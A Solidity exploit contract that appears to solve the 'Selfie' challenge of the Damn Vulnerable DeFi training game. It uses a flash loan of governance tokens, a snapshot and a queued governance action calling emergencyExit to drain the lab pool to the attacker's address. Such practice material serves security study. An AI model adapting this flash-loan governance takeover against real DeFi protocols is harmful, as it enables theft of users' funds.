// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "./ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

interface ISelfiePool {
    function maxFlashLoan(address _token) external view returns (uint256);

    function flashFee(address _token, uint256) external view returns (uint256);

    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function emergencyExit(address receiver) external;
}

contract SelfieAttack {
    ISimpleGovernance governance;
    ISelfiePool pool;
    DamnValuableTokenSnapshot public immutable token;

    address owner;

    constructor(
        address governanceAddress,
        address poolAddress,
        address _token
    ) {
        owner = msg.sender;
        governance = ISimpleGovernance(governanceAddress);
        pool = ISelfiePool(poolAddress);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() external {
        pool.flashLoan(
            address(this),
            address(token),
            pool.maxFlashLoan(address(token)),
            ""
        );
    }

    function onFlashLoan(
        address, // msg.sender
        address, // token
        uint256 amount, // amount
        uint256, // 0
        bytes calldata // data
    ) external returns (bytes32) {
        token.snapshot();

        governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        governance.executeAction(governance.getActionCounter() - 1);
    }
}
